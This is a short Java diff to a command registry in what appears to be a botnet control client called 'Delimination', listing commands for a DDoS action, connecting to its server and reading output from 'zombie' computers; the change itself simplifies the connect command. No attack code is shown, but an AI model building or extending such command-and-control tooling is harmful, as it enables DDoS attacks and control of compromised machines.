@@ -41,10 +41,8 @@ public class ClientCommands {
 						new FlagData("-v", "Checks if the address is valid before the DDoS starts.")));
 		commands.putCommand("disconnect", new CommandData("disconnect", "Disconnects from the Delimination server.", 0,
 				CommandActions.getDisconnectAction()));
-		commands.putCommand("connect",
-				new CommandData("connect", "Connects back to the Delimination server.", 1,
-						CommandActions.getConnectAction(),
-						new FlagData("-v", "Checks to see if the address is valid before connecting.")));
+		commands.putCommand("connect", new CommandData("connect", "Connects back to the Delimination server.", 0,
+				CommandActions.getConnectAction()));
 		commands.putCommand("rz",
 				new CommandData("rz <address>",
 						"Continuously reads the output from a zombie computer until the command is exited.", 1,
